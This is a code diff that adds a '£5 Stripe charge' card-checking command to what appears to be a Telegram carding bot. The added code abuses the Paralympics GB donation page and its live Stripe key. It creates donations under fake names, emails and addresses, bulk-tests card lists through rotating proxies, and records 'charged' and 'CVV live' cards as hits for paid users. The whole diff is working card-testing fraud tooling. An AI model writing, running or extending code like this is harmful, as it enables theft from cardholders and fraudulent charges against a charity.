@@ -31322,7 +31322,764 @@ async def mass_check_st1_gateway_command(update: Update, context: ContextTypes.D
     except:
         pass
 
-    await st1_gateway_mass_check_logic(update, context, cards, None)      
+    await st1_gateway_mass_check_logic(update, context, cards, None)    
+    
+    
+    
+    
+# ============================================================
+#  SITEBASE CVV CHARGE (£5) — Paralympics.org.uk Stripe Gateway
+#  Commands: /st  (single)  |  /mst (mass)
+# ============================================================
+
+import urllib.parse
+
+# ---- Config ----------------------------------------------------
+STRIP5_PK        = "pk_live_h88Yq5hugfKaUB8gJ7OFv3ot0046XoMB1l"
+STRIP5_SITE      = "https://paralympics.org.uk"
+STRIP5_GRAPHQL   = f"{STRIP5_SITE}/api/graphql"
+STRIP5_AMOUNT    = 500          # £5.00 = 500 pence
+STRIP5_CURRENCY  = "GBP"
+STRIP5_LABEL     = "Strip £5"
+
+# Active tasks for Strip5
+strip5_active_tasks = {}
+
+
+# ---- Helpers ---------------------------------------------------
+def strip5_parse_card(text: str) -> Optional[Dict]:
+    """Parse cc|mm|yy|cvv (any separator)."""
+    parts = re.split(r'[|:/\\\-\s]+', text.strip())
+    if len(parts) < 4:
+        return None
+    cc = re.sub(r'\D', '', parts[0])
+    if not (15 <= len(cc) <= 19):
+        return None
+    mm = parts[1].strip().zfill(2)
+    if not (len(mm) == 2 and mm.isdigit() and 1 <= int(mm) <= 12):
+        return None
+    yy = parts[2].strip()
+    if len(yy) == 4:
+        yy = yy[2:]
+    if len(yy) != 2:
+        return None
+    cvv = re.sub(r'\D', '', parts[3])
+    if not (3 <= len(cvv) <= 4):
+        return None
+    return {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}
+
+
+def strip5_rand_guid() -> str:
+    return str(uuid.uuid4()) + ''.join(random.choices('0123456789abcdef', k=8))
+
+
+def strip5_random_name_email() -> Tuple[str, str]:
+    first_names = ["James", "John", "Robert", "Michael", "William", "David",
+                   "Richard", "Joseph", "Thomas", "Charles", "Daniel",
+                   "Matthew", "Anthony", "Mark", "Steven", "Andrew"]
+    last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones",
+                  "Garcia", "Miller", "Davis", "Rodriguez", "Martinez",
+                  "Wilson", "Anderson", "Taylor", "Moore", "Jackson"]
+    fname = random.choice(first_names)
+    lname = random.choice(last_names)
+    email = f"{fname.lower()}.{lname.lower()}{random.randint(100, 9999)}@gmail.com"
+    return f"{fname} {lname}", email
+
+
+# ---- Core gateway logic ---------------------------------------
+async def strip5_create_charge(fullz: str, session: httpx.AsyncClient) -> Any:
+    """
+    Tokenize + GraphQL donate + confirm PI.
+    Returns either the httpx Response object (on success path)
+    or a plain string describing the early failure.
+    """
+    try:
+        parsed = strip5_parse_card(fullz)
+        if not parsed:
+            return "Invalid card format"
+
+        cc, mm, yy, cvv = parsed["cc"], parsed["mm"], parsed["yy"], parsed["cvv"]
+        full_name, email = strip5_random_name_email()
+        guid = strip5_rand_guid()
+
+        # ---- 1) Tokenize ----------------------------------------
+        tok_data = {
+            "guid": guid,
+            "muid": guid,
+            "sid":  guid,
+            "referrer": STRIP5_SITE,
+            "time_on_page": str(random.randint(30000, 90000)),
+            "card[number]": cc,
+            "card[cvc]": cvv,
+            "card[exp_month]": mm,
+            "card[exp_year]": yy,
+            "payment_user_agent": "stripe.js/bf317941e9; stripe-js-v3/bf317941e9; card-element",
+            "pasted_fields": "number",
+            "key": STRIP5_PK,
+        }
+        try:
+            tok_resp = await session.post(
+                "https://api.stripe.com/v1/tokens",
+                data=tok_data,
+                headers={
+                    "User-Agent": generate_user_agent(),
+                    "Accept": "application/json",
+                    "Content-Type": "application/x-www-form-urlencoded",
+                },
+            )
+        except Exception as e:
+            return f"Token request error: {str(e)[:80]}"
+
+        tok_json = tok_resp.json()
+        if "error" in tok_json:
+            err = tok_json["error"]
+            code = err.get("code", "")
+            decline = err.get("decline_code", "")
+            msg = err.get("message", "Token failed")
+            if code == "invalid_number":
+                return f"Invalid card number"
+            if decline:
+                return f"{decline}: {msg}"
+            return f"{code}: {msg}" if code else msg
+
+        tok_id = tok_json.get("id")
+        if not tok_id:
+            return "No token ID returned"
+
+        # ---- 2) GraphQL Donate ---------------------------------
+        gql_payload = {
+            "operationName": "Donate",
+            "variables": {
+                "name": full_name,
+                "email": email,
+                "amount": STRIP5_AMOUNT,
+                "line1": "1701 W Ashley Rd",
+                "city": "Boonville",
+                "country": "TH",
+                "postalCode": "65233-2748",
+                "giftAid": False,
+            },
+            "query": (
+                "mutation Donate($name:String!,$email:String!,$amount:Int!,"
+                "$line1:String!,$city:String!,$country:String!,"
+                "$postalCode:String!,$giftAid:Boolean!){"
+                "Donate(name:$name,email:$email,amount:$amount,"
+                "address:{line1:$line1,city:$city,country:$country,"
+                "postalCode:$postalCode},giftaid:$giftAid)"
+                "{id clientSecret __typename}}"
+            ),
+        }
+        try:
+            gql_resp = await session.post(
+                STRIP5_GRAPHQL,
+                json=gql_payload,
+                headers={
+                    "User-Agent": generate_user_agent(),
+                    "Accept": "application/json",
+                    "Content-Type": "application/json",
+                },
+            )
+        except Exception as e:
+            return f"GraphQL request error: {str(e)[:80]}"
+
+        try:
+            gql_json = gql_resp.json()
+            pi_id        = gql_json["data"]["Donate"]["id"]
+            client_secret = gql_json["data"]["Donate"]["clientSecret"]
+        except Exception:
+            return "GraphQL donate failed"
+
+        # ---- 3) Confirm PaymentIntent --------------------------
+        confirm_data = {
+            "payment_method_data[type]": "card",
+            "payment_method_data[card][token]": tok_id,
+            "payment_method_data[billing_details][address][city]": "Boonville",
+            "payment_method_data[billing_details][address][country]": "TH",
+            "payment_method_data[billing_details][address][line1]": "1701 W Ashley Rd",
+            "payment_method_data[billing_details][address][postal_code]": "65233-2748",
+            "payment_method_data[guid]": guid,
+            "payment_method_data[muid]": guid,
+            "payment_method_data[sid]":  guid,
+            "payment_method_data[payment_user_agent]": "stripe.js/bf317941e9; stripe-js-v3/bf317941e9",
+            "payment_method_data[referrer]": STRIP5_SITE,
+            "payment_method_data[time_on_page]": str(random.randint(30000, 90000)),
+            "expected_payment_method_type": "card",
+            "use_stripe_sdk": "true",
+            "key": STRIP5_PK,
+            "client_secret": client_secret,
+        }
+        try:
+            pi_resp = await session.post(
+                f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm",
+                data=confirm_data,
+                headers={
+                    "User-Agent": generate_user_agent(),
+                    "Accept": "application/json",
+                    "Content-Type": "application/x-www-form-urlencoded",
+                },
+            )
+        except Exception as e:
+            return f"PI confirm request error: {str(e)[:80]}"
+
+        # Tiny polite delay (matches original code)
+        await asyncio.sleep(0.3)
+        return pi_resp
+
+    except Exception as e:
+        return f"Exception: {str(e)[:80]}"
+
+
+# ---- Response parser ------------------------------------------
+def strip5_parse_response(result) -> Tuple[str, str]:
+    """
+    Returns (status_category, response_text).
+
+    Categories used by the mass worker:
+        CHARGED               → shown + hit notification
+        INSUFFICIENT_FUNDS    → shown, no hit notification
+        HIDDEN_3DS            → hidden
+        HIDDEN_LIVE           → hidden  (cvv live / transaction not allowed)
+        DECLINED              → hidden
+        ERROR                 → hidden
+    """
+    # Strings from early failures in strip5_create_charge
+    if isinstance(result, str):
+        low = result.lower()
+        if "insufficient" in low:
+            return "INSUFFICIENT_FUNDS", "Insufficient Funds"
+        if "invalid card" in low or "invalid_number" in low:
+            return "DECLINED", "Invalid Card Number"
+        if "expired" in low:
+            return "DECLINED", "Expired Card"
+        if "cvc" in low or "security code" in low:
+            return "HIDDEN_LIVE", "CVV Live"
+        if "declin" in low:
+            return "DECLINED", result
+        if "proxy" in low or "timeout" in low or "error" in low:
+            return "ERROR", result
+        return "DECLINED", result
+
+    # HTTP response
+    try:
+        text = result.text
+    except Exception:
+        return "ERROR", "No response text"
+
+    # ---- CHARGED ------------------------------------------------
+    if '"status": "succeeded"' in text or '"status":"succeeded"' in text:
+        return "CHARGED", "Charged £5 🔥"
+
+    # ---- INSUFFICIENT FUNDS (visible, but no hit notif) ---------
+    if "insufficient_funds" in text or "insufficient funds" in text \
+            or "Your card has insufficient funds" in text:
+        return "INSUFFICIENT_FUNDS", "Insufficient Funds"
+
+    # ---- 3DS / OTP → HIDDEN -------------------------------------
+    if "requires_action" in text or "stripe_3ds2_fingerprint" in text \
+            or "three_d_secure_redirect" in text \
+            or "card_error_authentication_required" in text:
+        return "HIDDEN_3DS", "3DS Required"
+
+    # ---- CVV live / transaction not allowed → HIDDEN ------------
+    if "incorrect_cvc" in text \
+            or "security code is incorrect" in text \
+            or "Your card's security code is incorrect." in text \
+            or "transaction_not_allowed" in text \
+            or '"cvc_check": "pass"' in text:
+        return "HIDDEN_LIVE", "CVV Live"
+
+    # ---- Declines (dead cards) → HIDDEN -------------------------
+    decline_codes = (
+        "generic_decline",
+        "card_decline_rate_limit_exceeded",
+        "do_not_honor",
+        "fraudulent",
+        "stolen_card",
+        "lost_card",
+        "pickup_card",
+        "expired_card",
+        "incorrect_number",
+        "invalid_cvc",
+        "card_not_supported",
+        "call_issuer",
+        "invalid_account",
+        "live_mode_test_card",
+    )
+    for code in decline_codes:
+        if code in text:
+            return "DECLINED", code.replace("_", " ").title()
+
+    if "card_declined" in text:
+        return "DECLINED", "Card Declined"
+
+    # ---- Stripe config errors ----------------------------------
+    if "Invalid API Key" in text or "api_key_expired" in text \
+            or "testmode_charges_only" in text:
+        return "ERROR", "Stripe API config error"
+
+    # ---- Generic fallback --------------------------------------
+    return "DECLINED", "Card Declined"
+
+
+# ============================================================
+#   PREMIUM-EMOJI RESULT FORMATTER  (matches /sh style)
+# ============================================================
+def strip5_format_result(status_category: str, response_text: str,
+                          card: str, bin_info: tuple,
+                          elapsed: float) -> str:
+    bin_info_text, bank, country, _, _ = bin_info
+
+    if status_category == "CHARGED":
+        emoji = premium_emoji(PREMIUM_EMOJI_IDS.get("charged", "5039670412733055750"), "🔥")
+        label = "CHARGED"
+    elif status_category == "INSUFFICIENT_FUNDS":
+        emoji = premium_emoji(PREMIUM_EMOJI_IDS.get("money", "5201873447554145566"), "💰")
+        label = "INSUFFICIENT FUNDS"
+    elif status_category == "3DS":
+        emoji = premium_emoji(PREMIUM_EMOJI_IDS.get("lock", "5197288647275071607"), "🔐")
+        label = "3D REQUIRED"
+    elif status_category == "LIVE":
+        emoji = premium_emoji(PREMIUM_EMOJI_IDS.get("approved", "6266787022111773140"), "✅")
+        label = "CVV LIVE"
+    elif status_category == "DECLINED":
+        emoji = premium_emoji(PREMIUM_EMOJI_IDS.get("declined", "6267039884016358504"), "❌")
+        label = "DECLINED"
+    else:
+        emoji = premium_emoji(PREMIUM_EMOJI_IDS.get("error", "6282641460093260838"), "⚠️")
+        label = "ERROR"
+
+    clean_resp = response_text[:80]
+
+    diamond_emoji = premium_emoji(PREMIUM_EMOJI_IDS.get("diamond", "5427168083074628963"), "💎")
+    flower_emoji  = premium_emoji(PREMIUM_EMOJI_IDS.get("flower",  "6230927657257668107"), "🌸")
+    toy_emoji     = premium_emoji(PREMIUM_EMOJI_IDS.get("toy",     "5249244862359812334"), "📍")
+    doller_emoji  = premium_emoji(PREMIUM_EMOJI_IDS.get("doller",  "5197434882321567830"), "💵")
+    id_emoji      = premium_emoji(PREMIUM_EMOJI_IDS.get("id",      "5307905813451397794"), "👤")
+    bank_emoji    = premium_emoji(PREMIUM_EMOJI_IDS.get("bank",    "5332455502917949981"), "🏦")
+    star_emoji    = premium_emoji(PREMIUM_EMOJI_IDS.get("star",    "6282793227057632654"), "⭐")
+
+    country_name = (country or "Unknown").replace("🌐", "").strip()
+
+    return (
+        f"<b>Strip £5</b> {diamond_emoji}\n\n"
+        f"{flower_emoji} 𝗖𝗔𝗥𝗗  ↣ <code>{card}</code>\n\n"
+        f"{emoji} 𝗦𝘁𝗮𝘁𝘂𝘀  ↣ {label}\n"
+        f"{toy_emoji} 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲  ↣  {clean_resp}\n"
+        f"{doller_emoji} 𝗣𝗿𝗶𝗰𝗲  ↣  £5.00\n\n"
+        f"{id_emoji} 𝗕𝗜𝗡  ↣  {bin_info_text}\n"
+        f"{bank_emoji} 𝗕𝗮𝗻𝗸  ↣  {bank}\n"
+        f"{star_emoji} 𝗖𝗼𝘂𝗻𝘁𝗿𝘆  ↣  {country_name}"
+    )
+# ============================================================
+#   /st  —  SINGLE CHECK
+# ============================================================
+@check_gateway("stripe_charge")
+async def strip5_single(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Single card check via Paralympics £5 Stripe gateway."""
+    if not await verify_group_access(update, context):
+        return
+
+    user_id = update.effective_user.id
+    message = update.effective_message
+
+    if not context.args:
+        await message.reply_text(
+            "💳 <b>Strip £5 — Single Check</b>\n\n"
+            "Usage: <code>/st &lt;card&gt;</code>\n"
+            "Example: <code>/st 4242424242424242|12|2029|123</code>",
+            parse_mode=ParseMode.HTML,
+        )
+        return
+
+    card = card_formatter.extract_single_card_from_text(" ".join(context.args).strip())
+    if not card:
+        await message.reply_text("❌ Invalid card format. Use: NUMBER|MM|YYYY|CVV")
+        return
+
+    # Credits
+    can_proceed, err = await check_and_deduct_credits(
+        user_id, update, context, is_mass_check=False, card_count=1)
+    if not can_proceed:
+        await message.reply_text(err, parse_mode=ParseMode.HTML)
+        return
+
+    # Gateway access
+    if not user_manager.can_access_gateway(user_id, 'stripe_charge'):
+        tier = user_manager.get_tier(user_id)
+        await message.reply_text(
+            f"❌ Strip £5 not available for {tier.upper()} tier.",
+            parse_mode=ParseMode.HTML)
+        add_user_credits(user_id, 1)
+        return
+
+    tier = user_manager.get_tier(user_id)
+    status_msg = await message.reply_text("🔄 Checking card with Strip £5...")
+
+    try:
+        # Proxy (optional)
+        proxy_url = None
+        if user_manager.can_use_proxy(user_id):
+            if user_id in autosopi_proxy_tracker.working_proxies and \
+               autosopi_proxy_tracker.working_proxies[user_id]:
+                proxy_url = autosopi_proxy_tracker.working_proxies[user_id][0]
+
+        client_kwargs = {
+            "timeout": httpx.Timeout(45.0, connect=15.0, read=35.0),
+            "verify": False,
+            "follow_redirects": True,
+        }
+        if proxy_url:
+            formatted = format_proxy(proxy_url)
+            if formatted:
+                client_kwargs["proxy"] = formatted
+
+        t0 = time.time()
+        async with httpx.AsyncClient(**client_kwargs) as session:
+            raw = await strip5_create_charge(card, session)
+        elapsed = time.time() - t0
+
+        status_category, response_text = strip5_parse_response(raw)
+        bin_info = await get_bin_info(card)
+
+        ui = strip5_format_result(status_category, response_text,
+                                   card, bin_info, elapsed)
+
+        try:
+            await status_msg.delete()
+        except Exception:
+            pass
+        await message.reply_text(ui, parse_mode=ParseMode.HTML)
+
+        # Hit bookkeeping
+        if status_category in ("CHARGED", "3DS", "LIVE"):
+            await save_hit_to_file(
+                card=card, gateway="Strip £5",
+                response=response_text, price="£5.00",
+                bin_info=bin_info, user_id=user_id, user_tier=tier)
+
+            if status_category == "CHARGED":
+                user_data = user_manager.get_user(user_id)
+                await send_hit_notification(
+                    context=context, gateway="Strip £5",
+                    card=card, response=response_text, price="£5.00",
+                    user=user_data, bin_info=bin_info,
+                    status_category="charged")
+                user_manager.increment_hits(user_id)
+
+        user_manager.increment_checks(user_id)
+
+    except Exception as e:
+        try:
+            await status_msg.delete()
+        except Exception:
+            pass
+        await message.reply_text(f"❌ Error: {str(e)[:100]}")
+        print(f"❌ [Strip5 single] {traceback.format_exc()}")
+        add_user_credits(user_id, 1)
+
+
+# ============================================================
+#   /mst  —  MASS CHECK
+# ============================================================
+@check_gateway("stripe_charge")
+async def strip5_mass(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Mass check via Paralympics £5 Stripe gateway."""
+    if not await verify_group_access(update, context):
+        return
+
+    user_id = update.effective_user.id
+    message = update.effective_message
+
+    # Gateway access
+    if not user_manager.can_access_gateway(user_id, 'stripe_charge'):
+        tier = user_manager.get_tier(user_id)
+        await message.reply_text(
+            f"❌ Strip £5 not available for {tier.upper()} tier.",
+            parse_mode=ParseMode.HTML)
+        return
+
+    # Mass check permission
+    if not user_manager.can_mass_check(user_id):
+        tier = user_manager.get_tier(user_id)
+        await message.reply_text(
+            f"❌ Mass check not available for {tier.upper()} tier.\n\n"
+            f"Use <code>/st &lt;card&gt;</code> for single checks.",
+            parse_mode=ParseMode.HTML)
+        return
+
+    # Source of cards: reply-to-file OR command args
+    cards = []
+
+    if message.reply_to_message and message.reply_to_message.document:
+        try:
+            file = await message.reply_to_message.document.get_file()
+            content = await file.download_as_bytearray()
+            content = content.decode("utf-8", errors="ignore")
+            for line in content.splitlines():
+                line = line.strip()
+                if line and not line.startswith("#"):
+                    c = card_formatter.extract_single_card_from_text(line)
+                    if c:
+                        cards.append(c)
+        except Exception as e:
+            await message.reply_text(f"❌ File read error: {str(e)[:100]}")
+            return
+    elif context.args:
+        for tok in " ".join(context.args).split():
+            c = card_formatter.extract_single_card_from_text(tok)
+            if c:
+                cards.append(c)
+    else:
+        await message.reply_text(
+            "📦 <b>Strip £5 — Mass Check</b>\n\n"
+            "Usage:\n"
+            "• <code>/mst &lt;card1&gt; &lt;card2&gt; ...</code>\n"
+            "• Reply to a .txt file with <code>/mst</code>",
+            parse_mode=ParseMode.HTML)
+        return
+
+    if not cards:
+        await message.reply_text("❌ No valid cards found.")
+        return
+
+    # Batch limit
+    max_batch = user_manager.get_max_batch_size(user_id)
+    if len(cards) > max_batch:
+        cards = cards[:max_batch]
+        await message.reply_text(f"⚠️ Truncated to {max_batch} cards.")
+
+    # Credits
+    can_proceed, err = await check_and_deduct_mass_credits(
+        user_id, update, context, len(cards))
+    if not can_proceed:
+        await message.reply_text(err, parse_mode=ParseMode.HTML)
+        return
+
+    try:
+        await message.delete()
+    except Exception:
+        pass
+
+    await strip5_mass_logic(update, context, cards, None)
+
+
+async def strip5_mass_logic(update: Update, context: ContextTypes.DEFAULT_TYPE,
+                            cards: list, progress_msg=None):
+    """
+    Strip £5 mass check.
+    - Only CHARGED + INSUFFICIENT_FUNDS cards are shown in chat.
+    - 3DS / OTP / CVV-live / dead / errors are silently counted (hidden).
+    - Hit notification fires only for CHARGED cards.
+    """
+    u_id = update.effective_user.id
+    message = update.effective_message
+    total = len(cards)
+
+    if u_id in strip5_active_tasks:
+        await message.reply_text("⚠️ Already running a Strip £5 session. Use /stop.")
+        return
+
+    print(f"\n{'='*80}\n🚀 [STRIP5 MASS] user={u_id} cards={total}\n{'='*80}")
+
+    # Proxies for rotation
+    user_proxies = []
+    if user_manager.can_use_proxy(u_id):
+        if u_id in autosopi_proxy_tracker.working_proxies and \
+           autosopi_proxy_tracker.working_proxies[u_id]:
+            user_proxies = autosopi_proxy_tracker.working_proxies[u_id]
+            print(f"🔌 {len(user_proxies)} proxies for rotation")
+
+    stats = {
+        "charged": 0,
+        "approved": 0,          # = insufficient funds
+        "declined": 0,          # dead cards (hidden)
+        "hidden_3ds": 0,        # 3DS / OTP (hidden)
+        "hidden_live": 0,       # cvv-live / txn-not-allowed (hidden)
+        "errors": 0,
+        "processed": 0,
+        "total": total,
+    }
+    start_time = time.time()
+    proxy_index = 0
+
+    try:
+        strip5_active_tasks[u_id] = True
+        tier = user_manager.get_tier(u_id)
+
+        CONCURRENCY = {
+            "free": 1, "premium": 1, "ultimate": 5, "admin": 5,
+        }.get(tier, 2)
+
+        # Emojis for progress
+        approved_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
+        charged_emoji  = premium_emoji(PREMIUM_EMOJI_IDS["charged"],  "🔥")
+        dead_emoji     = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
+        errors_emoji   = premium_emoji(PREMIUM_EMOJI_IDS["error"],    "⚠️")
+
+        if progress_msg is None:
+            initial = (
+                f"<b>Gateway</b> ➛ Strip £5\n"
+                f"<b>Status</b> ➛ STARTING...\n"
+                f"<b>Checked</b> ➛ 0/{total}\n"
+                f"<b>Charged</b> ➛ 0 {charged_emoji}\n"
+                f"<b>Approved</b> ➛ 0 {approved_emoji}\n"
+                f"<b>Declined</b> ➛ 0 {dead_emoji}\n"
+                f"<b>Errors</b> ➛ 0 {errors_emoji}\n"
+                f"<b>Time</b> ➛ 0s"
+            )
+            progress_msg = await message.reply_text(initial, parse_mode=ParseMode.HTML)
+
+        sem = asyncio.Semaphore(CONCURRENCY)
+        stats_lock = asyncio.Lock()
+        processed = 0
+
+        async def update_progress(force: bool = False):
+            if not force and processed and processed % 5 != 0 and processed < total:
+                return
+            elapsed = int(time.time() - start_time)
+            mins, secs = elapsed // 60, elapsed % 60
+            tstr = f"{mins}m {secs}s" if mins else f"{secs}s"
+            text = (
+                f"<b>Gateway</b> ➛ Strip £5\n"
+                f"<b>Status</b> ➛ PROCESSING {processed}/{total}\n"
+                f"<b>Checked</b> ➛ {processed}/{total}\n"
+                f"<b>Charged</b> ➛ {stats['charged']} {charged_emoji}\n"
+                f"<b>Approved</b> ➛ {stats['approved']} {approved_emoji}\n"
+                f"<b>Declined</b> ➛ {stats['declined']} {dead_emoji}\n"
+                f"<b>Errors</b> ➛ {stats['errors']} {errors_emoji}\n"
+                f"<b>Time</b> ➛ {tstr}"
+            )
+            try:
+                await progress_msg.edit_text(text, parse_mode=ParseMode.HTML)
+            except Exception:
+                pass
+
+        async def process_one(card, idx):
+            nonlocal processed, proxy_index
+            async with sem:
+                await asyncio.sleep(random.uniform(0.1, 0.3))
+
+                # Pick proxy
+                proxy_url = None
+                if user_proxies:
+                    proxy_url = user_proxies[proxy_index % len(user_proxies)]
+                    proxy_index += 1
+
+                client_kwargs = {
+                    "timeout": httpx.Timeout(45.0, connect=15.0, read=35.0),
+                    "verify": False,
+                    "follow_redirects": True,
+                }
+                if proxy_url:
+                    f = format_proxy(proxy_url)
+                    if f:
+                        client_kwargs["proxy"] = f
+
+                t0 = time.time()
+                try:
+                    async with httpx.AsyncClient(**client_kwargs) as session:
+                        raw = await strip5_create_charge(card, session)
+                except Exception as e:
+                    raw = f"Request error: {str(e)[:80]}"
+                elapsed = time.time() - t0
+
+                status_category, response_text = strip5_parse_response(raw)
+
+                # ── bookkeeping (silent for hidden results) ──
+                async with stats_lock:
+                    processed += 1
+                    if status_category == "CHARGED":
+                        stats["charged"] += 1
+                    elif status_category == "INSUFFICIENT_FUNDS":
+                        stats["approved"] += 1
+                    elif status_category == "DECLINED":
+                        stats["declined"] += 1
+                    elif status_category == "HIDDEN_3DS":
+                        stats["hidden_3ds"] += 1
+                    elif status_category == "HIDDEN_LIVE":
+                        stats["hidden_live"] += 1
+                    else:  # ERROR
+                        stats["errors"] += 1
+
+                    await update_progress()
+
+                # ── DISPLAY: only CHARGED + INSUFFICIENT_FUNDS ──
+                if status_category in ("CHARGED", "INSUFFICIENT_FUNDS"):
+                    bin_info = await get_bin_info(card)
+                    ui = strip5_format_result(
+                        status_category, response_text,
+                        card, bin_info, elapsed)
+                    try:
+                        await message.reply_text(ui, parse_mode=ParseMode.HTML)
+                    except Exception as e:
+                        print(f"❌ send result: {e}")
+
+                    await save_hit_to_file(
+                        card=card, gateway="Strip £5",
+                        response=response_text, price="£5.00",
+                        bin_info=bin_info, user_id=u_id, user_tier=tier)
+
+                    # Hit notification ONLY for CHARGED
+                    if status_category == "CHARGED":
+                        user_data = user_manager.get_user(u_id)
+                        await send_hit_notification(
+                            context=context, gateway="Strip £5",
+                            card=card, response=response_text, price="£5.00",
+                            user=user_data, bin_info=bin_info,
+                            status_category="charged")
+                        user_manager.increment_hits(u_id)
+
+                # ── HIDDEN categories: nothing to send ──
+                # (HIDDEN_3DS, HIDDEN_LIVE, DECLINED, ERROR all fall through)
+
+                user_manager.increment_checks(u_id, 1)
+
+        # Run all cards with concurrency
+        tasks = [asyncio.create_task(process_one(c, i)) for i, c in enumerate(cards)]
+        for coro in asyncio.as_completed(tasks):
+            if u_id not in strip5_active_tasks:
+                break
+            try:
+                await coro
+            except Exception as e:
+                print(f"❌ task error: {e}")
+                async with stats_lock:
+                    stats["errors"] += 1
+
+        if u_id in strip5_active_tasks:
+            total_t = time.time() - start_time
+            mins, secs = int(total_t // 60), int(total_t % 60)
+            await update_progress(force=True)
+            summary = (
+                f" <b>Strip £5 Mass Check Complete</b>\n\n"
+                f"{charged_emoji} <b>Charged</b> ➛ {stats['charged']}\n"
+                f"{approved_emoji} <b>Insufficient Funds</b> ➛ {stats['approved']}\n"
+                f"{dead_emoji} <b>Declined</b> ➛ {stats['declined']} \n"
+                f"🔐 <b>3DS / OTP</b> ➛ {stats['hidden_3ds']} \n"
+                f"✅ <b>CVV Live</b> ➛ {stats['hidden_live']} \n"
+                f"{errors_emoji} <b>Errors</b> ➛ {stats['errors']} \n"
+                f"📝 <b>Total</b> ➛ {total}\n"
+                f"⏱️ <b>Time</b> ➛ {mins}m {secs}s"
+            )
+            await message.reply_text(summary, parse_mode=ParseMode.HTML)
+
+        return stats
+
+    except Exception as e:
+        print(f"❌ strip5_mass_logic error: {e}\n{traceback.format_exc()}")
+        try:
+            if progress_msg:
+                await progress_msg.edit_text(f"❌ Error: {str(e)[:100]}")
+        except Exception:
+            pass
+    finally:
+        strip5_active_tasks.pop(u_id, None)
+        print(f"🏁 [Strip5 Mass] session ended for user {u_id}")
+    
+    
+    
+    
+      
         
 # ============ ADYEN GATEWAY (Picsart) - FIXED ============
 # Add this after your other gateway configurations
@@ -69538,6 +70295,9 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f' <b> Stripe Auth </b>\n'
             f'   /chk - Single check\n'
             f'   /mchk - Mass check\n\n'
+            f' <b>Strip_5$</b>\n'
+            f'   /st - Single check\n'
+            f'   /mst - Mass check\n\n'
         )
         
         keyboard = [
@@ -70052,9 +70812,11 @@ async def handle_reply_with_command(update: Update, context: ContextTypes.DEFAUL
         
         '/mchk': 'stripe_chk',
         '/chk' : 'stripe_chk',
+        
+        '/mst': 'strip5',
+        '/st':  'strip5',
          
-        '/mst': 'stripe_1usd',
-        '/st': 'stripe_1usd',
+        
          
     }
     
@@ -70068,8 +70830,6 @@ async def handle_reply_with_command(update: Update, context: ContextTypes.DEFAUL
         await update.message.reply_text(
             f"❌ Invalid command. Use:\n"
             f"/msh - Autosopi (Shopify)\n"
-            f"/mrz - Razorpay\n"
-            f"/mchk - Auto Stripe\n"
             f"/mst - Stripe Charge ",
             parse_mode=ParseMode.HTML
         )
@@ -70334,6 +71094,8 @@ async def handle_reply_with_command(update: Update, context: ContextTypes.DEFAUL
         asyncio.create_task(st1_gateway_mass_check_logic(update, context, cards, progress_msg))
     elif gateway == 'stripe_1usd':
         asyncio.create_task(mass_check_stripe_1usd_logic(update, context, cards, progress_msg))
+    elif gateway == 'strip5':
+        asyncio.create_task(strip5_mass_logic(update, context, cards, progress_msg))
     else:
         await update.message.reply_text(f"❌ Gateway {gateway} not implemented yet.")
     
@@ -70535,6 +71297,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"{warning}"
                 f"💡 <b>Reply to this file with a mass check command:</b>\n"
                 f"• <code>/msh</code> - Shopify Mass\n"
+                f"• <code>/mst</code> - STRIP_5$\n"
                 f"📌 Or use <code>/cancel</code> to cancel processing."
             )
             
@@ -77434,6 +78197,9 @@ def main():
     
     app.add_handler(CommandHandler("b3", single_check_b3charged))
     
+    
+    app.add_handler(CommandHandler("st",  strip5_single,  block=False))
+    app.add_handler(CommandHandler("mst", strip5_mass,    block=False))
        
 
     
